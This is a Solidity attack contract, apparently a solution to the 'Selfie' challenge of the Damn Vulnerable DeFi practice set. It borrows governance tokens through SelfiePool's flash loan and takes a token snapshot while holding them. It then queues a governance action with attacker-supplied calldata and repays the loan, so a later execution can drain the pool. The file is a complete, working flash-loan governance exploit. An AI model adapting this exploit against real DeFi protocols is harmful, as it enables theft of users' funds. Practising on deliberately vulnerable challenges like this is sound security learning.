pragma solidity ^0.6.0;
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie {
    address private attacker;
    SelfiePool public selfiePool;
    DamnValuableTokenSnapshot public damnToken;
    SimpleGovernance public simpleGovernance;
    bytes public data;
    uint256 public actionId;

    modifier onlyAttacker() {
        require(msg.sender == attacker, "You are not attacker");
        _;
    }

    constructor(address _selfiePool, address _simpleGovernance) public {
        attacker = msg.sender;
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
    }

    function loan(uint256 _amount, bytes calldata _data) external onlyAttacker {
        data = _data;
        selfiePool.flashLoan(_amount);
    }

    function receiveTokens(address _damnToken, uint256 _amount) external {
        damnToken = DamnValuableTokenSnapshot(_damnToken);
        damnToken.snapshot();
        actionId = simpleGovernance.queueAction(address(selfiePool), data, 0);
        damnToken.transfer(address(selfiePool), _amount);
    }
}
